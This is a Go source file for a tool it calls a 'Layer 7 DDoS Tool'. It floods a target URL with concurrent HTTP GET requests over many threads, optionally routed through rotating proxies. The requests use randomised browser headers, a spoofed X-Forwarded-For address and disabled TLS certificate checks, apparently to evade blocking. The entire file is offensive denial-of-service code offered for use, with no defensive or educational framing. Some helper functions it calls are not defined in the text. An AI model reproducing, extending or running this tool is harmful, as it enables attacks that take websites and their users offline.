package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	banner = `    _____  __         _      
   / ___/ / /_ _____ (_)_  __
   \__ \ / __// ___// /| |/_/
  ___/ // /_ / /   / /_>  <  
 /____/ \__//_/   /_//_/|_|  
                            v4.0`
	usage = `Usage: go run main.go <target> <time> <rate> <threads>`
)

type Config struct {
	Target    string
	Time      int
	Rate      int
	Threads   int
	UseProxy  bool
	ProxyFile string
}

var logger = log.New(os.Stdout, "[INFO] ", log.LstdFlags|log.Lshortfile)

func main() {
	if len(os.Args) < 5 {
		fmt.Println(usage)
		os.Exit(1)
	}

	config := &Config{
		Target:   os.Args[1],
		Time:     parseInt(os.Args[2]),
		Rate:     parseInt(os.Args[3]),
		Threads:  parseInt(os.Args[4]),
		UseProxy: askUseProxy(),
	}

	if config.UseProxy {
		fmt.Print("Enter proxy file path: ")
		fmt.Scanln(&config.ProxyFile)

		proxies := loadProxies(config.ProxyFile)
		if len(proxies) == 0 {
			logger.Fatal("No proxies loaded. Exiting.")
		}
		runAttack(config, proxies)
	} else {
		runAttack(config, nil)
	}
}

func runAttack(config *Config, proxies []string) {
	printBanner(config)

	var wg sync.WaitGroup
	for i := 1; i <= config.Threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()
			workerThread(threadID, config, proxies)
		}(i)
	}

	time.Sleep(time.Duration(config.Time) * time.Second)
	logger.Println("Attack Completed.")
}

func askUseProxy() bool {
	var response string
	fmt.Print("Use proxy? (yes/no): ")
	fmt.Scanln(&response)
	return strings.ToLower(response) == "yes"
}

func parseInt(s string) int {
	val, err := strconv.Atoi(s)
	if err != nil {
		logger.Fatalf("Error parsing integer: %v", err)
	}
	return val
}

func loadProxies(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		logger.Fatalf("Error opening proxy file: %v", err)
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" && validateProxyFormat(proxy) {
			proxies = append(proxies, proxy)
		}
	}
	if err := scanner.Err(); err != nil {
		logger.Fatalf("Error reading proxies: %v", err)
	}
	return proxies
}

func validateProxyFormat(proxy string) bool {
	_, err := url.Parse("http://" + proxy)
	return err == nil
}

func printBanner(config *Config) {
	fmt.Println(banner)
	fmt.Println("-------------------------------------------")
	fmt.Printf("-> Target \t: %s\n", config.Target)
	fmt.Printf("-> Time \t: %d seconds\n", config.Time)
	fmt.Printf("-> Rate \t: %d\n", config.Rate)
	fmt.Printf("-> Threads\t: %d\n", config.Threads)
	if config.UseProxy {
		fmt.Printf("-> ProxyFile\t: %s\n", config.ProxyFile)
	} else {
		fmt.Println("-> ProxyFile\t: Not Used")
	}
	fmt.Println("-------------------------------------------")
	fmt.Println("-> Layer 7 DDoS Tool Initialized")
	fmt.Println("-------------------------------------------")
	fmt.Println()
}

// ---- Worker Logic ----
func workerThread(id int, config *Config, proxies []string) {
	logger.Printf("Worker Thread %d Started\n", id)
	client := createHTTPClient(proxies, config.UseProxy)
	targetURL, err := url.Parse(config.Target)
	if err != nil {
		logger.Printf("Error parsing target URL: %v", err)
		return
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for range ticker.C {
		var wg sync.WaitGroup
		for i := 0; i < config.Rate; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				req := buildRequest(targetURL)
				makeRequest(client, req, 3)
			}()
		}
		wg.Wait()
	}
}

// ---- Modul Retry Cerdas ----
func makeRequest(client *http.Client, req *http.Request, retries int) {
	for i := 0; i < retries; i++ {
		resp, err := client.Do(req)
		if err != nil {
			logger.Printf("Request error (attempt %d): %v", i+1, err)
			time.Sleep(time.Second * 2) // Tunggu sebelum mencoba ulang
			continue
		}
		defer resp.Body.Close()
		break
	}
}

func createHTTPClient(proxies []string, useProxy bool) *http.Client {
	timeout := 60 * time.Second

	if useProxy && len(proxies) > 0 {
		return &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				Proxy: func(_ *http.Request) (*url.URL, error) {
					proxy := proxies[rand.Intn(len(proxies))]
					return url.Parse("http://" + proxy)
				},
			},
			Timeout: timeout,
		}
	}
	return &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: timeout,
	}
}

func buildRequest(targetURL *url.URL) *http.Request {
	req, _ := http.NewRequest("GET", targetURL.String(), nil)
	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", getRandomAccept())
	req.Header.Set("Accept-Language", getRandomLanguage())
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Referer", targetURL.String()) // Tambahkan Referer
	req.Header.Set("X-Forwarded-For", generateIP())
	return req
}
